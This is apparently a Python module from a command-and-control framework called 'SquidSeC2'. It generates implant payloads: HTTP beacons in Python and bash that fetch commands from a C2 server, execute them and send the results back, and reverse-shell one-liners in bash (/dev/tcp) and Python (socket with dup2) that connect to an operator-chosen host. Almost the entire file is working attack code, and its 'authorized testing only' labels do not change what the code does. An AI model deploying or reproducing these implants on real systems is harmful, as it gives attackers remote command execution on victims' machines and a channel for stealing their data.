"""Deterministic payload templates for authorized testing only."""

from __future__ import annotations

import base64
from typing import Any


class PayloadGenerator:
    """Template-based payload generation. Prefer determinism over creativity."""

    TEMPLATES = ("http_beacon_python", "http_beacon_bash", "reverse_shell_bash", "reverse_shell_python")

    def list_templates(self) -> list[str]:
        return list(self.TEMPLATES)

    def generate(
        self,
        template: str,
        host: str,
        port: int,
        session_path: str = "/api/v1/implant/beacon",
        interval: int = 5,
        extra: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        if template not in self.TEMPLATES:
            raise ValueError(f"Unknown template: {template}. Allowed: {self.TEMPLATES}")
        extra = extra or {}
        if template == "http_beacon_python":
            body = self._http_beacon_python(host, port, session_path, interval)
        elif template == "http_beacon_bash":
            body = self._http_beacon_bash(host, port, session_path, interval)
        elif template == "reverse_shell_bash":
            body = self._revshell_bash(host, port)
        elif template == "reverse_shell_python":
            body = self._revshell_python(host, port)
        else:
            raise ValueError(template)
        encoded = base64.b64encode(body.encode()).decode()
        return {
            "template": template,
            "host": host,
            "port": port,
            "content": body,
            "content_b64": encoded,
            "notes": "Authorized testing only. Use only on systems you own or have permission to test.",
        }

    def _http_beacon_python(self, host: str, port: int, path: str, interval: int) -> str:
        return f'''#!/usr/bin/env python3
# SquidSeC2 HTTP beacon — authorized testing only
import json, time, urllib.request
C2 = "http://{host}:{port}{path}"
SID = None
while True:
    try:
        req = urllib.request.Request(C2, data=json.dumps({{"session_id": SID, "hostname": __import__("socket").gethostname()}}).encode(), headers={{"Content-Type": "application/json"}})
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.loads(r.read().decode())
            SID = data.get("session_id", SID)
            task = data.get("task")
            if task:
                import subprocess
                out = subprocess.getoutput(task.get("command", "echo ok"))
                done = urllib.request.Request(C2 + "/result", data=json.dumps({{"task_id": task["id"], "result": out}}).encode(), headers={{"Content-Type": "application/json"}})
                urllib.request.urlopen(done, timeout=30).read()
    except Exception:
        pass
    time.sleep({interval})
'''

    def _http_beacon_bash(self, host: str, port: int, path: str, interval: int) -> str:
        return f'''#!/bin/bash
# SquidSeC2 HTTP beacon — authorized testing only
C2="http://{host}:{port}{path}"
SID=""
while true; do
  RESP=$(curl -s -X POST "$C2" -H "Content-Type: application/json" -d "{{\\"session_id\\":\\"$SID\\",\\"hostname\\":\\"$(hostname)\\"}}" || true)
  SID=$(echo "$RESP" | sed -n 's/.*"session_id":"\\([^"]*\\)".*/\\1/p')
  CMD=$(echo "$RESP" | sed -n 's/.*"command":"\\([^"]*\\)".*/\\1/p')
  TID=$(echo "$RESP" | sed -n 's/.*"id":"\\([^"]*\\)".*/\\1/p')
  if [ -n "$CMD" ] && [ -n "$TID" ]; then
    OUT=$(eval "$CMD" 2>&1 | head -c 8192)
    curl -s -X POST "$C2/result" -H "Content-Type: application/json" -d "{{\\"task_id\\":\\"$TID\\",\\"result\\":$(echo "$OUT" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')}}" >/dev/null
  fi
  sleep {interval}
done
'''

    def _revshell_bash(self, host: str, port: int) -> str:
        return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"

    def _revshell_python(self, host: str, port: int) -> str:
        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
